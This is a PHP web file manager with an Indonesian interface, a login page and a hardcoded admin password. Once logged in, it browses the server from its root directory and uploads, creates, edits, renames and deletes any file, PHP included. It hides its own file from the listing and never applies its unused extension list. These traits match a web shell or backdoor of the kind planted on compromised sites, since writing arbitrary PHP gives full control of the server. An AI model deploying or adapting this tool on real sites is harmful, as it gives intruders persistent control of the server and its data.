<?php
session_start();

$USERNAME = 'admin';
$PASSWORD = 'whous@465';

if (isset($_POST['login'])) {
    if ($_POST['username'] === $USERNAME && $_POST['password'] === $PASSWORD) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Username atau password salah!";
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Cek session timeout (30 menit)
if (isset($_SESSION['logged_in']) && isset($_SESSION['login_time'])) {
    if (time() - $_SESSION['login_time'] > 1800) {
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    $_SESSION['login_time'] = time(); // Reset timer
}

// Redirect ke login jika belum login
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - File Manager</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: Arial, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            .login-container {
                background: white;
                padding: 40px;
                border-radius: 12px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                width: 100%;
                max-width: 400px;
            }
            .login-container h1 {
                text-align: center;
                color: #333;
                margin-bottom: 10px;
                font-size: 28px;
            }
            .login-container p {
                text-align: center;
                color: #666;
                margin-bottom: 30px;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: #333;
                font-weight: 500;
            }
            .form-group input {
                width: 100%;
                padding: 12px;
                border: 2px solid #ddd;
                border-radius: 6px;
                font-size: 14px;
                transition: border-color 0.3s;
            }
            .form-group input:focus {
                outline: none;
                border-color: #667eea;
            }
            .login-btn {
                width: 100%;
                padding: 12px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                border-radius: 6px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: transform 0.2s;
            }
            .login-btn:hover {
                transform: translateY(-2px);
            }
            .error-message {
                background: #f8d7da;
                color: #721c24;
                padding: 12px;
                border-radius: 6px;
                margin-bottom: 20px;
                border: 1px solid #f5c6cb;
                text-align: center;
            }
            .icon {
                text-align: center;
                font-size: 60px;
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="icon">🔐</div>
            <h1>File Manager</h1>
            <p>Silakan login untuk melanjutkan</p>
            <?php if (isset($login_error)): ?>
                <div class="error-message"><?= htmlspecialchars($login_error) ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required autofocus>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" name="login" class="login-btn">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Konfigurasi
$root_dir = '/'; // Mulai dari root sistem
$allowed_extensions = ['txt', 'html', 'css', 'js', 'php', 'json', 'xml', 'md'];
$max_file_size = 5 * 1024 * 1024; // 5MB

// Get current directory
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
$current_path = realpath($current_dir);

// Security: pastikan path valid
if ($current_path === false) {
    $current_path = __DIR__;
}

// Fungsi helper
function get_files($dir) {
    $files = [];
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item != '.' && $item != '..' && $item != basename(__FILE__)) {
            $path = $dir . '/' . $item;
            $files[] = [
                'name' => $item,
                'path' => $path,
                'type' => is_dir($path) ? 'dir' : 'file',
                'size' => is_file($path) ? filesize($path) : 0,
                'modified' => filemtime($path)
            ];
        }
    }
    // Sort: folders first, then files
    usort($files, function($a, $b) {
        if ($a['type'] === $b['type']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return $a['type'] === 'dir' ? -1 : 1;
    });
    return $files;
}

function get_relative_path($full_path, $root) {
    return $full_path;
}

// Handle actions
$message = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Create folder
    if (isset($_POST['create_folder'])) {
        $folder_name = basename($_POST['folder_name']);
        if (!empty($folder_name)) {
            $new_folder = $current_path . '/' . $folder_name;
            if (mkdir($new_folder, 0755)) {
                $message = "Folder '$folder_name' berhasil dibuat!";
            } else {
                $error = "Gagal membuat folder!";
            }
        }
    }
    
    // Create file
    if (isset($_POST['create_file'])) {
        $file_name = basename($_POST['file_name']);
        if (!empty($file_name)) {
            $new_file = $current_path . '/' . $file_name;
            if (file_put_contents($new_file, '') !== false) {
                @chmod($new_file, 0644); // Set permission
                $message = "File '$file_name' berhasil dibuat!";
            } else {
                $error = "Gagal membuat file! Cek permission folder: " . $current_path;
            }
        }
    }
    
    // Upload file
    if (isset($_FILES['upload_file'])) {
        $file = $_FILES['upload_file'];
        if ($file['error'] === 0) {
            $filename = basename($file['name']);
            $target = $current_path . '/' . $filename;
            if (move_uploaded_file($file['tmp_name'], $target)) {
                $message = "File '$filename' berhasil diupload!";
            } else {
                $error = "Gagal mengupload file!";
            }
        }
    }
    
    // Save/Edit file
    if (isset($_POST['save_file'])) {
        $filename = basename($_POST['filename']);
        $content = $_POST['content'];
        $filepath = $current_path . '/' . $filename;
        
        // Cek apakah file bisa ditulis
        if (!is_writable($filepath) && file_exists($filepath)) {
            @chmod($filepath, 0644); // Coba ubah permission
        }
        
        $result = file_put_contents($filepath, $content);
        if ($result !== false) {
            $message = "File '$filename' berhasil disimpan! (" . $result . " bytes)";
        } else {
            $error = "Gagal menyimpan file! Pastikan file memiliki permission write (644 atau 666). Path: " . $filepath;
        }
    }
    
    // Rename file
    if (isset($_POST['rename_file'])) {
        $old_name = basename($_POST['old_name']);
        $new_name = basename($_POST['new_name']);
        $old_path = $current_path . '/' . $old_name;
        $new_path = $current_path . '/' . $new_name;
        if (rename($old_path, $new_path)) {
            $message = "Berhasil direname dari '$old_name' ke '$new_name'!";
        } else {
            $error = "Gagal merename!";
        }
    }
    
    // Delete file/folder
    if (isset($_POST['delete_file'])) {
        $filename = basename($_POST['delete_name']);
        $filepath = $current_path . '/' . $filename;
        if (is_dir($filepath)) {
            if (rmdir($filepath)) {
                $message = "Folder '$filename' berhasil dihapus!";
            } else {
                $error = "Gagal menghapus folder! (Pastikan folder kosong)";
            }
        } else {
            if (unlink($filepath)) {
                $message = "File '$filename' berhasil dihapus!";
            } else {
                $error = "Gagal menghapus file!";
            }
        }
    }
}

// Get file content for editing
$edit_file = '';
$edit_content = '';
if (isset($_GET['edit'])) {
    $edit_file = basename($_GET['edit']);
    $edit_path = $current_path . '/' . $edit_file;
    if (file_exists($edit_path) && is_file($edit_path)) {
        $edit_content = file_get_contents($edit_path);
    }
}

$files = get_files($current_path);
$relative_path = $current_path;

// Build breadcrumb
$breadcrumb = [];
$parts = explode('/', trim($current_path, '/'));
$path_build = '';
foreach ($parts as $part) {
    if (!empty($part)) {
        $path_build .= '/' . $part;
        $breadcrumb[] = ['name' => $part, 'path' => $path_build];
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { color: #333; margin-bottom: 20px; }
        .message { padding: 10px; margin-bottom: 15px; border-radius: 4px; }
        .message.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .message.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .breadcrumb { background: #f8f9fa; padding: 10px 15px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }
        .breadcrumb a { color: #007bff; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .breadcrumb span { color: #6c757d; margin: 0 5px; }
        .section { margin-bottom: 30px; }
        .section h2 { color: #555; margin-bottom: 15px; font-size: 18px; }
        .form-group { margin-bottom: 15px; }
        .form-inline { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        input[type="file"], input[type="text"], textarea { padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        input[type="text"] { width: 300px; }
        textarea { width: 100%; height: 300px; font-family: monospace; font-size: 14px; }
        button { padding: 8px 16px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; margin-right: 5px; }
        button:hover { background: #0056b3; }
        button.success { background: #28a745; }
        button.success:hover { background: #218838; }
        button.danger { background: #dc3545; }
        button.danger:hover { background: #c82333; }
        button.warning { background: #ffc107; color: #333; }
        button.warning:hover { background: #e0a800; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #f8f9fa; font-weight: bold; }
        tr:hover { background: #f8f9fa; }
        .actions { display: flex; gap: 5px; flex-wrap: wrap; }
        .file-icon { margin-right: 5px; }
        .folder-link { color: #007bff; text-decoration: none; font-weight: bold; cursor: pointer; }
        .folder-link:hover { text-decoration: underline; }
        .create-section { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media (max-width: 768px) {
            .create-section { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📁 File Manager</h1>
        
        <?php if ($message): ?>
            <div class="message success"><?= htmlspecialchars($message) ?></div>
        <?php endif; ?>
        
        <?php if ($error): ?>
            <div class="message error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
        
        <!-- Breadcrumb / Path Navigation -->
        <div class="breadcrumb">
            <strong>📂 Path:</strong> 
            <a href="?dir=/">Root (/)</a>
            <?php foreach ($breadcrumb as $crumb): ?>
                <span>/</span>
                <a href="?dir=<?= urlencode($crumb['path']) ?>"><?= htmlspecialchars($crumb['name']) ?></a>
            <?php endforeach; ?>
            <div style="margin-top: 10px;">
                <form method="GET" class="form-inline" style="display: inline-flex; gap: 5px;">
                    <input type="text" name="dir" value="<?= htmlspecialchars($current_path) ?>" placeholder="/path/to/directory" style="width: 400px;">
                    <button type="submit">Go</button>
                </form>
            </div>
        </div>
        
        <!-- Create File & Folder Section -->
        <div class="section">
            <h2>Buat Baru</h2>
            <div class="create-section">
                <div>
                    <h3 style="font-size: 16px; margin-bottom: 10px;">📁 Buat Folder</h3>
                    <form method="POST" class="form-inline">
                        <input type="text" name="folder_name" placeholder="Nama folder" required>
                        <button type="submit" name="create_folder" class="success">Buat Folder</button>
                    </form>
                </div>
                <div>
                    <h3 style="font-size: 16px; margin-bottom: 10px;">📄 Buat File</h3>
                    <form method="POST" class="form-inline">
                        <input type="text" name="file_name" placeholder="Nama file (contoh: index.html)" required>
                        <button type="submit" name="create_file" class="success">Buat File</button>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Upload Section -->
        <div class="section">
            <h2>Upload File</h2>
            <form method="POST" enctype="multipart/form-data" class="form-inline">
                <input type="file" name="upload_file" required>
                <button type="submit">Upload</button>
            </form>
        </div>
        
        <!-- Edit Section -->
        <?php if ($edit_file): ?>
        <div class="section">
            <h2>Edit File: <?= htmlspecialchars($edit_file) ?></h2>
            <?php 
            $edit_path = $current_path . '/' . $edit_file;
            $is_writable = is_writable($edit_path);
            $file_perms = substr(sprintf('%o', fileperms($edit_path)), -4);
            ?>
            <?php if (!$is_writable): ?>
                <div class="message error">
                    ⚠️ File tidak bisa ditulis! Permission: <?= $file_perms ?> 
                    <br>Untuk memperbaiki, jalankan di terminal: <code>chmod 644 <?= htmlspecialchars($edit_path) ?></code>
                </div>
            <?php endif; ?>
            <form method="POST">
                <input type="hidden" name="filename" value="<?= htmlspecialchars($edit_file) ?>">
                <textarea name="content" <?= !$is_writable ? 'readonly' : '' ?>><?= htmlspecialchars($edit_content) ?></textarea><br><br>
                <button type="submit" name="save_file" <?= !$is_writable ? 'disabled' : '' ?>>Simpan</button>
                <button type="button" onclick="window.location.href='?dir=<?= urlencode($current_path) ?>'">Batal</button>
            </form>
        </div>
        <?php endif; ?>
        
        <!-- File List -->
        <div class="section">
            <h2>Daftar File & Folder</h2>
            <?php if ($current_path !== '/'): ?>
                <div style="margin-bottom: 10px;">
                    <a href="?dir=<?= urlencode(dirname($current_path)) ?>">
                        <button>⬆️ Kembali ke Atas</button>
                    </a>
                </div>
            <?php endif; ?>
            <table>
                <thead>
                    <tr>
                        <th>Nama</th>
                        <th>Ukuran</th>
                        <th>Terakhir Diubah</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($files)): ?>
                        <tr><td colspan="4" style="text-align: center; color: #999;">Folder kosong</td></tr>
                    <?php endif; ?>
                    <?php foreach ($files as $file): ?>
                    <tr>
                        <td>
                            <?php if ($file['type'] === 'dir'): ?>
                                <span class="file-icon">📁</span>
                                <a href="?dir=<?= urlencode($current_path . '/' . $file['name']) ?>" class="folder-link">
                                    <?= htmlspecialchars($file['name']) ?>
                                </a>
                            <?php else: ?>
                                <span class="file-icon">📄</span>
                                <?= htmlspecialchars($file['name']) ?>
                            <?php endif; ?>
                        </td>
                        <td><?= $file['type'] === 'file' ? number_format($file['size']) . ' bytes' : '-' ?></td>
                        <td><?= date('Y-m-d H:i:s', $file['modified']) ?></td>
                        <td class="actions">
                            <?php if ($file['type'] === 'file'): ?>
                                <a href="?dir=<?= urlencode($current_path) ?>&edit=<?= urlencode($file['name']) ?>">
                                    <button>Edit</button>
                                </a>
                            <?php endif; ?>
                            <button class="warning" onclick="renameItem('<?= htmlspecialchars($file['name']) ?>')">Rename</button>
                            <form method="POST" style="display: inline;" onsubmit="return confirm('Yakin ingin menghapus <?= $file['type'] === 'dir' ? 'folder' : 'file' ?> ini?')">
                                <input type="hidden" name="delete_name" value="<?= htmlspecialchars($file['name']) ?>">
                                <button type="submit" name="delete_file" class="danger">Hapus</button>
                            </form>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>
    
    <script>
        function renameItem(oldName) {
            const newName = prompt('Masukkan nama baru:', oldName);
            if (newName && newName !== oldName) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = `
                    <input type="hidden" name="old_name" value="${oldName}">
                    <input type="hidden" name="new_name" value="${newName}">
                    <input type="hidden" name="rename_file" value="1">
                `;
                document.body.appendChild(form);
                form.submit();
            }
        }
    </script>
</body>
</html>
